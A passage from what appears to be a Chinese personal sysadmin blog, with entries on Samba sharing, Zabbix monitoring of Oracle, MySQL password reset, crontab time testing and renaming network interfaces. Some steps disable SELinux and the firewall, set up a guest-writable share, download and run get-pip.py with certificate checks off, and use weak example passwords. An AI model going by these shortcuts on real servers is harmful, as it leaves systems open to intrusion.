<h2 id="二-编辑-配置文件，设置共享时的信息"><a href="#二-编辑-配置文件，设置共享时的信息" class="headerlink" title="二 编辑 配置文件，设置共享时的信息"></a>二 编辑 配置文件，设置共享时的信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]# vim /etc/samba/smb.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">可以把之前配置文件中的所有配置全部注释掉，只留下如下配置</span></span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROP</span><br><span class="line">security = user</span><br><span class="line"></span><br><span class="line">passdb backend = tdbsam</span><br><span class="line">map to guest=Bad User</span><br><span class="line">printing = cups</span><br><span class="line">printcap name = cups</span><br><span class="line">load printers = yes</span><br><span class="line">cups options = raw</span><br><span class="line"></span><br><span class="line">[FileShare]			#此处的名字是将要显示在windows看到的名字</span><br><span class="line">path=/windows		#此处的目录是将要共享的目录</span><br><span class="line">public=yes</span><br><span class="line">writeable=yes</span><br><span class="line">create mask=0644</span><br><span class="line">directory mask=0755</span><br></pre></td></tr></table></figure>

<h2 id="三-测试配置的文件是否正确："><a href="#三-测试配置的文件是否正确：" class="headerlink" title="三 测试配置的文件是否正确："></a>三 测试配置的文件是否正确：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon samba]# testparm </span><br><span class="line">Load smb config files from /etc/samba/smb.conf</span><br><span class="line">Loaded services file OK.</span><br><span class="line">Server role: ROLE_STANDALONE</span><br><span class="line"></span><br><span class="line">Press enter to see a dump of your service definitions</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">Global parameters</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">	map to guest = Bad User</span><br><span class="line">	printcap name = cups</span><br><span class="line">	security = USER</span><br><span class="line">	workgroup = WORKGROP</span><br><span class="line">	idmap config * : backend = tdb</span><br><span class="line">	cups options = raw</span><br><span class="line"></span><br><span class="line">[FileShare]</span><br><span class="line">	create mask = 0644</span><br><span class="line">	guest ok = Yes</span><br><span class="line">	path = /windows</span><br><span class="line">	read only = No</span><br></pre></td></tr></table></figure>

<h2 id="四-安装包"><a href="#四-安装包" class="headerlink" title="四 安装包"></a>四 安装包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost samba]# yum -y install samba</span><br></pre></td></tr></table></figure>

<h2 id="五-打开服务并关键访问策略"><a href="#五-打开服务并关键访问策略" class="headerlink" title="五 打开服务并关键访问策略"></a>五 打开服务并关键访问策略</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost samba]# systemctl start smb</span><br><span class="line">[root@localhost samba]# setenforce 0</span><br><span class="line"></span><br><span class="line">[root@localhost samba]# systemctl status smb</span><br><span class="line">● smb.service - Samba SMB Daemon</span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/smb.service; disabled; vendor preset: disabled)</span><br><span class="line">Active: active (running) since Tue 2019-04-16 18:38:36 PDT; 2min 27s ago</span><br><span class="line">Docs: man:smbd(8)</span><br><span class="line">man:samba(7)</span><br><span class="line">man:smb.conf(5)</span><br><span class="line">Main PID: 28414 (smbd)</span><br><span class="line">Status: "smbd: ready to serve connections..."</span><br><span class="line">Memory: 16.6M</span><br><span class="line">CGroup: /system.slice/smb.service</span><br><span class="line">├─28414 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">├─28416 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">├─28417 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">└─28418 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line"></span><br><span class="line">Apr 16 18:38:35 localhost.localdomain systemd[1]: Starting Samba SMB Daemon...</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: [2019/04/16 18:38:36.121155, 0] ../lib/param/loadparm.c:784(lpcfg_map_parameter)</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: Unknown parameter encountered: "commem"</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: [2019/04/16 18:38:36.121372, 0] ../lib/param/loadparm.c:1844(lpcfg_do_service_parameter)</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: Ignoring unknown parameter "commem"</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: [2019/04/16 18:38:36.171093, 0] ../lib/util/become_daemon.c:138(daemon_ready)</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain smbd[28414]: daemon_ready: STATUS=daemon 'smbd' finished starting up and ready to serve connections</span><br><span class="line">Apr 16 18:38:36 localhost.localdomain systemd[1]: Started Samba SMB Daemon.</span><br></pre></td></tr></table></figure>

<p>这里我按照网上的配置地sharefile里面加 commen=this is a share file 时发现有报错，于是，我直接注释掉这个配置信息，就是一个提示信息而已，不影响</p>
<p>再一次查看启动状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost samba]# systemctl status smb</span><br><span class="line">● smb.service - Samba SMB Daemon</span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/smb.service; disabled; vendor preset: disabled)</span><br><span class="line">Active: active (running) since Tue 2019-04-16 18:43:40 PDT; 5s ago</span><br><span class="line">Docs: man:smbd(8)</span><br><span class="line">man:samba(7)</span><br><span class="line">man:smb.conf(5)</span><br><span class="line">Main PID: 28525 (smbd)</span><br><span class="line">Status: "smbd: ready to serve connections..."</span><br><span class="line">Memory: 20.8M</span><br><span class="line">CGroup: /system.slice/smb.service</span><br><span class="line">├─28525 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">├─28527 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">├─28528 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line">└─28529 /usr/sbin/smbd --foreground --no-process-group</span><br><span class="line"></span><br><span class="line">Apr 16 18:43:40 localhost.localdomain systemd[1]: Starting Samba SMB Daemon...</span><br><span class="line">Apr 16 18:43:40 localhost.localdomain systemd[1]: Started Samba SMB Daemon.</span><br><span class="line">Apr 16 18:43:40 localhost.localdomain smbd[28525]: [2019/04/16 18:43:40.665073, 0] ../lib/util/become_daemon.c:138(daemon_ready)</span><br><span class="line">Apr 16 18:43:40 localhost.localdomain smbd[28525]: daemon_ready: STATUS=daemon 'smbd' finished starting up and ready to serve connecti</span><br></pre></td></tr></table></figure>

<p>这时候，发现，启动完全正常</p>
<h2 id="六-查看使用的端口以及端口状态："><a href="#六-查看使用的端口以及端口状态：" class="headerlink" title="六 查看使用的端口以及端口状态："></a>六 查看使用的端口以及端口状态：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@bogon samba]# netstat -lntp |grep smb</span><br><span class="line">tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1472/smbd           </span><br><span class="line">tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1472/smbd           </span><br><span class="line">tcp6       0      0 :::139                  :::*                    LISTEN      1472/smbd           </span><br><span class="line">tcp6       0      0 :::445                  :::*                    LISTEN      1472/smbd</span><br></pre></td></tr></table></figure>

<h2 id="七-在window端使用telnet-尝试发现，端口不通"><a href="#七-在window端使用telnet-尝试发现，端口不通" class="headerlink" title="七 在window端使用telnet 尝试发现，端口不通"></a>七 在window端使用telnet 尝试发现，端口不通</h2><p>telnet 192.168.80.133 139 被拒绝</p>
<h2 id="八-关闭防火墙，也可以开放相应的端口"><a href="#八-关闭防火墙，也可以开放相应的端口" class="headerlink" title="八 关闭防火墙，也可以开放相应的端口"></a>八 关闭防火墙，也可以开放相应的端口</h2><p>我这里直接爆力关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost samba]# systemctl stop firewalld</span><br></pre></td></tr></table></figure>



<h2 id="九-在真机再一次尝试"><a href="#九-在真机再一次尝试" class="headerlink" title="九 在真机再一次尝试"></a>九 在真机再一次尝试</h2><p><img src= "/img/loading.gif" data-src="/2020/09/08/%E4%BD%BF%E7%94%A8samba%E5%AE%8C%E6%88%90linux%E4%B8%8Ewindows%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/image-20200908092248025.png" alt="image-20200908092248025"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/%E4%BD%BF%E7%94%A8samba%E5%AE%8C%E6%88%90linux%E4%B8%8Ewindows%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/image-20200908092335575.png" alt="image-20200908092335575"></p>
<p>这一次正常访问了，至此，共享成功</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>使用zabbix监控oracle数据库</title>
    <url>/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="使用zabbix监控oracle数据库"><a href="#使用zabbix监控oracle数据库" class="headerlink" title="使用zabbix监控oracle数据库"></a>使用zabbix监控oracle数据库</h1><p>所用得到软件在这个链接里 </p>
<p>链接：<a href="https://pan.baidu.com/s/18DFp1aqTkqHL1ewJ0o9n7g" target="_blank" rel="noopener">https://pan.baidu.com/s/18DFp1aqTkqHL1ewJ0o9n7g</a><br>提取码：y7le</p>
<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>zabbix是一款非常强大，同时也是应用最为广泛的开源监控软件，本文将给大家介绍如何利用zabbix+python监控oracle数据库。</p>
<h2 id="二、环境介绍"><a href="#二、环境介绍" class="headerlink" title="二、环境介绍"></a>二、环境介绍</h2><p>以下是我安装的环境，实际部署时并不需要跟我的环境一样。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.监控机 Redhat Linux 6.5 + Zabbix server 3.4.10 + Python 2.6.6 (操作系统自带) + Oracle Client 11.2 (x86_64)</span><br><span class="line"></span><br><span class="line">2.被监控机 Oracle 11.2.0.4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 实测 Centos 7 也同样可以用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> oracle版本	11.2.0.4</span></span><br></pre></td></tr></table></figure>

<h2 id="三、选择监控方式"><a href="#三、选择监控方式" class="headerlink" title="三、选择监控方式"></a>三、选择监控方式</h2><p>zabbix监控的方式主要有以下三种类型</p>
<h3 id="Zabbix-agent"><a href="#Zabbix-agent" class="headerlink" title="Zabbix agent"></a>Zabbix agent</h3><p>在被监控机上面安装zabbix agent，zabbix agent将被监控机采集到的数据发送给zabbix server。这种方式最常用，一般用来采集服务器的cpu、内存等信息。</p>
<h3 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h3><p>一些网络设备如交换机，上面无法安装zabbix agent，所以只能通过snmp的方式收集监控数据如端口状态，流量等。</p>
<h3 id="External-check"><a href="#External-check" class="headerlink" title="External check"></a>External check</h3><p>在zabbix server上面运行查询脚本，直接查询被监控机上的数据。<strong>此种方式在被监控机上面不需要做任何部署</strong>，所有查询全部从zabbix server上面发出，所以对zabbix server的性能要求较高，官方不推荐大量使用该方式。对于少量的oracle数据库服务器，可以采用该方式。</p>
<p><strong>本文介绍的就是使用external check方式去监控oracle数据库。</strong></p>
<h2 id="四、规划监控项"><a href="#四、规划监控项" class="headerlink" title="四、规划监控项"></a>四、规划监控项</h2><p>监控数据库的目的是为了保障数据库稳定运行，一旦出现故障，dba能够及时发现并介入处理，监控项分为以下两类</p>
<p>1.数据库空间不足或数据库发生故障，DBA需要立即处理。</p>
<p>监控项包括表空间、用户状态、实例状态、锁、大量等待事件、闪回区使用率等。此类监控项需要给其设置触发器，一旦出现异常，及时告警。</p>
<p>2.数据库运行状态的一些统计信息，为DBA定位数据库性能问题发生的时间和类别提供参考。</p>
<p>监控项包括常见的等待事件发生的次数，命中率、硬解析比例等。</p>
<p>下面表格中列出附件中模板的监控项</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910112335247.png" alt="image-20200910112335247"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910112403700.png" alt="image-20200910112403700"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910112420200.png" alt="image-20200910112420200"></p>
<h2 id="五、安装"><a href="#五、安装" class="headerlink" title="五、安装"></a>五、安装</h2><p>上面闲话扯完，进入正式安装环节，我假定你已经安装了zabbix server，因此这里略过zabbix server的安装步骤。</p>
<p><strong>以下所有操作均在zabbix</strong>服务器上面执行</p>
<p>请务必看清，接下来的操作都是在zabbix-server端完成的</p>
<h3 id="安装oracle客户端"><a href="#安装oracle客户端" class="headerlink" title="安装oracle客户端"></a>安装oracle客户端</h3><p>从官网下载如下三个rpm包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">oracle-instantclient11.2-basic-11.2.0.4.0-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">oracle-instantclient11.2-devel-11.2.0.4.0-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">oracle-instantclient11.2-sqlplus-11.2.0.4.0-1.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p>使用root安装oracle客户端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh oracle-instantclient11.2-basic-11.2.0.4.0-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh oracle-instantclient11.2-devel-11.2.0.4.0-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh oracle-instantclient11.2-sqlplus-11.2.0.4.0-1.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p>配置环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim + /etc/profile</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line"></span><br><span class="line">export ORACLE_HOME=/usr/lib/oracle/11.2/client64</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=$ORACLE_HOME/lib</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$ORACLE_HOME/bin</span><br></pre></td></tr></table></figure>

<p>执行下面的命令让配置生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>添加动态库配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi + /etc/ld.so.conf.d/oracle.conf</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">/usr/lib/oracle/11.2/client64/lib</span><br></pre></td></tr></table></figure>

<p>执行命令ldconfig</p>
<p>连接oracle进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SQL&gt; sqlplus scott&#x2F;tiger@192.168.56.101:1521&#x2F;orcltest</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.4.0 Production on Wed Apr 24 18:24:28 2019</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2013, Oracle. All rights reserved.</span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line"></span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">With the Partitioning, OLAP, Data Mining and Real Application Testing options</span><br><span class="line"></span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure>

<p>出现上面的提示证明oracle client安装成功</p>
<h3 id="安装python相关包"><a href="#安装python相关包" class="headerlink" title="安装python相关包"></a>安装python相关包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">安装cx_Oracle(python连接oracle的包)</span><br><span class="line"></span><br><span class="line">wget http://downloads.sourceforge.net/project/cx-oracle/5.1.2/cx_Oracle-5.1.2-11g-py26-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">rpm -ivh cx_Oracle-5.1.2-11g-py26-1.x86_64.rpm</span><br><span class="line"></span><br><span class="line">安装argparse</span><br><span class="line"></span><br><span class="line">wget https://bootstrap.pypa.io/2.6/get-pip.py --no-check-certificate</span><br><span class="line"></span><br><span class="line">python get-pip.py</span><br><span class="line"></span><br><span class="line">pip install argparse</span><br><span class="line"><span class="meta">#</span><span class="bash">	这一步可能会出现问题，如果报错 line 9 有问题</span></span><br><span class="line"><span class="meta">#</span><span class="bash">	首先执行</span></span><br><span class="line">pip install --upgrade pip	#看到Successfully字样即安装成功</span><br><span class="line">pip install cx_oracle		#	然后安装cx_oracle</span><br></pre></td></tr></table></figure>

<h3 id="上传python脚本"><a href="#上传python脚本" class="headerlink" title="上传python脚本"></a>上传python脚本</h3><p>将附件中的pyora.py脚本放入/usr/lib/zabbix/externalscripts/目录下</p>
<p>赋权限，让zabbix用户能够执行该脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 /usr/lib/zabbix/externalscripts/pyora.py</span><br></pre></td></tr></table></figure>

<p><em>[注意：<strong>先在被监控机的oracle</strong>数据库中创建监控用户，用户名和密码可以自己随意指定</em></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">create user zabbix identified by zabbix;</span><br><span class="line"></span><br><span class="line">grant connect, select any dictionary to zabbix;</span><br></pre></td></tr></table></figure>

<h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python pyora.py --username zabbix --password zabbix --address 10.30.10.32 --port 1521 --database office show_tablespaces</span><br><span class="line"></span><br><span class="line">上面测试脚本的参数说明</span><br><span class="line">username: 用户名</span><br><span class="line">password: 密码</span><br><span class="line">address: 被监控机ip地址</span><br><span class="line">port: 端口号</span><br><span class="line">database: oracle service name</span><br><span class="line">有返回结果表示脚本能正常运行</span><br><span class="line">返回结果是一个集合，里面有键值对</span><br></pre></td></tr></table></figure>

<h3 id="上传template文件"><a href="#上传template文件" class="headerlink" title="上传template文件"></a>上传template文件</h3><p>将附件中的Pyora_ExternalCheck_11G.xml模板导入到zabbix server中</p>
<p>在zabbix页面中，依次点击Configuration – Templates – Import – 选择文件 – Import，即完成了导入</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133312126.png" alt="image-20200910133312126"></p>
<h3 id="添加机器，并链接到模板"><a href="#添加机器，并链接到模板" class="headerlink" title="添加机器，并链接到模板"></a>添加机器，并链接到模板</h3><p>在zabbix页面中，依次点击Configuration – Hosts – Create host – Hostname (输入ip地址) – groups (选Linux servers) – Templates (选择Pyora_ExternalCheck_11G) – 点击上面的Add – Macros – 点击上面的Add添加宏，全部添加完毕后，点击下面的Add，主机即添加完毕</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133402667.png" alt="image-20200910133402667"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133425981.png" alt="image-20200910133425981"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133434432.png" alt="image-20200910133434432"></p>
<h3 id="查看监控数据"><a href="#查看监控数据" class="headerlink" title="查看监控数据"></a>查看监控数据</h3><p>Monitoring – Latest Data – Host (选择对应的主机)，则可以看到监控的数据了</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133454636.png" alt="image-20200910133454636"></p>
<h3 id="添加自定义监控项"><a href="#添加自定义监控项" class="headerlink" title="添加自定义监控项"></a>添加自定义监控项</h3><p>如果你想监控其它的数据，则只需要在pyora.py中添加一个函数，然后在模板中创建一个监控项，Key末尾对应相应的函数名即可，十分方便</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133511338.png" alt="image-20200910133511338"></p>
<p>上图中函数名为check_active，则下图对应的Key为pyora.py[–username,{$USERNAME},–password,{$PASSWORD},–address,{$ADDRESS},–database,{$DATABASE},–port,{$PORT},check_active]</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7oracle%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200910133548666.png" alt="image-20200910133548666"></p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>修改 mysql 密码 Unknown column &#39;password&#39; in &#39;field list&#39;</title>
    <url>/2020/04/12/%E4%BF%AE%E6%94%B9%20mysql%20%E5%AF%86%E7%A0%81%20Unknown%20column%20&#39;password&#39;%20in%20&#39;field%20list&#39;/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="修改-mysql-密码-Unknown-column-‘password’-in-‘field-list’"><a href="#修改-mysql-密码-Unknown-column-‘password’-in-‘field-list’" class="headerlink" title="修改 mysql 密码 Unknown column ‘password’ in ‘field list’"></a>修改 mysql 密码 Unknown column ‘password’ in ‘field list’</h2><p>MySQL 5.7.16 修改密码提示 ERROR 1054 (42S22): Unknown column ‘password’ in ‘field list’的原因分析及解决办法,需要的朋友可以参考下</p>
<p>wamp:将my.ini中的skip-grant-tables注释去掉，<br>mysql: 启动 mysqld –skip-grant-tables;<br>命令行无法操作后，在打开一个命令行，到 mysql 的bin目录下，启动mysql.exe</p>
<p>然后在命令行中以mysql -u root -p可以直接进入，但是执行</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; update mysql.user set password=password('password') where user='root';</span><br></pre></td></tr></table></figure>

<p>会出现以下错误</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ERROR 1054 (42S22): Unknown column 'password' in 'field list'</span><br></pre></td></tr></table></figure>

<p>错误原因：mysql数据库下已经没有password这个字段了，password字段改成了authentication_string。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; update mysql.user set authentication_string=PASSWORD('password') where Use</span><br><span class="line">r='root';</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line">exit;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.15 sec)</span><br><span class="line">Rows matched: 1 Changed: 1 Warnings: 1</span><br></pre></td></tr></table></figure>

<p>之后，记得注释掉my.ini中的skip-grant-tables。</p>
<p>最后，操作完后重新启动mysql服务，便可以用之前设置好的密码登录了。</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>修改Linux服务器时间测试crontab</title>
    <url>/2018/07/22/%E4%BF%AE%E6%94%B9Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E9%97%B4%E6%B5%8B%E8%AF%95crontab/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近在公司做的一个应用，有跟时间有关的逻辑，测试人员需要对这个逻辑进行测试，需要修改Linux服务器的时间，开始的时候，我们使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web_test www]``# date -s '2019-07-21 9:59'</span><br></pre></td></tr></table></figure>

<p>来修改系统的时间，输入date之后也看到了时间确实被改了，于是我们在等待crontab自动执行10点钟的定时脚本，时间到了之后，我们查看脚本的输出日志，日志的时间或者是日志根本不存在，也就是说脚本根本就没有本执行（我们的脚本手动执行是不会有问题的）。为了排查问题，我们把crontab的中的脚本原来定在10点钟跑的改成了每分钟都会跑，结果是它成功执行了，那么这就说明我们的crontab本身是没有问题的，问题就出在系统时间上了！</p>
<p>查阅了相关的资料发现：在系统启动时，Linux操作系统将时间从CMOS中读到系统时间变量中，以后修改时间通过修改系统时间实现。为了保持系统时间与CMOS时间的一致性，Linux每隔一段时间会将系统时间写入CMOS。由于该同步是每隔一段时间（大约是11分钟）进行的，在我们执行date -s后，如果马上重起机器，修改时间就有可能没有被写入CMOS！这就是为什么我们的脚本不执行的问题的原因了。如果要确保修改生效要执行如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web_test www]``# clock -w</span><br></pre></td></tr></table></figure>

<p>修改了系统时间之后再输入clock -w就可以将系统时间写入CMOS，然后我们的crontab定时脚本就跑起来了！</p>
<p>诶，等一下，那我们改了系统的时间怎么把系统的时间还原成现实中的时间呢？不要看着你的手表手动输入，要那种很准确的时间？</p>
<p>我们要做的就是寻找一个网络时间服务器，比如一些国家授时中心，我查了有这些：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">微软公司授时主机(美国)</span><br><span class="line">time.windows.com</span><br><span class="line">台警大授时中心(台湾)</span><br><span class="line">asia.pool.ntp.org</span><br><span class="line">中科院授时中心(西安)</span><br><span class="line">210.72.145.44</span><br><span class="line">网通授时中心(北京)</span><br><span class="line">219.158.14.130</span><br></pre></td></tr></table></figure>

<p>我们只要运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@web_test www]``# ntpdate asia.pool.ntp.org</span><br></pre></td></tr></table></figure>

<p>然后再输入clock -w就手动将系统时间写入CMOS，就OK啦！</p>
]]></content>
      <categories>
        <category>crontab</category>
      </categories>
      <tags>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>修改Linux网卡名（非Udev且无需重启）</title>
    <url>/2019/11/22/%E4%BF%AE%E6%94%B9Linux%E7%BD%91%E5%8D%A1%E5%90%8D%EF%BC%88%E9%9D%9EUdev%E4%B8%94%E6%97%A0%E9%9C%80%E9%87%8D%E5%90%AF%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="修改Linux网卡名（非Udev且无需重启）"><a href="#修改Linux网卡名（非Udev且无需重启）" class="headerlink" title="修改Linux网卡名（非Udev且无需重启）"></a><strong>修改Linux网卡名（非Udev且无需重启）</strong></h1><p>默认的情况下，不同版本的<code>CentOS</code>的网卡名字也不一样，例如<code>CentOS6.x</code>的网卡名为<code>ethN</code>，而<code>CentOS7.x</code>的网卡名为<code>emN</code>，所以在公司里，为了统一维护所有的机器，网卡名的设置也需要一致，否则在监控网络流量这一项，如果网卡名不一致，会带来额外的工作量</p>
<p>网络上设置网卡的大多数方案是修改<code>Udev</code>配置，并重启，这种方案太重了，对于已经运行的机器不能采用这样的方式，遂决定用英文关键字<code>modify network interface name</code>搜索，终于找到了以下答案，满足了自己的需求。</p>
<p><em>注意：对于远程联网的机器，要确保你有两个网卡：例如一个内网一个外网，否则你在关闭网卡时，会失去与主机的连接</em></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig peth0 down  </span><br><span class="line">ip link set peth0 name eth0  </span><br><span class="line">ifconfig eth0 up</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>修改网卡名</category>
      </categories>
      <tags>
        <tag>Centos</tag>
      </tags>
  </entry>
  <entry>
    <title>删除/etc/passwd文件怎么办</title>
    <url>/2020/01/15/%E5%88%A0%E9%99%A4passwd%E6%96%87%E4%BB%B6%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>我们在操作的时候，如果不小心删掉/etc/passwd文件，我们该怎样解决呢？</strong></p>
<p>在Linux 中 /etc/passwd文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p>
<p>比如说：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root❌0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>从上面的例子我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p>
<p>1.用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</p>
<p>2.用户名(login_name):是代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。</p>
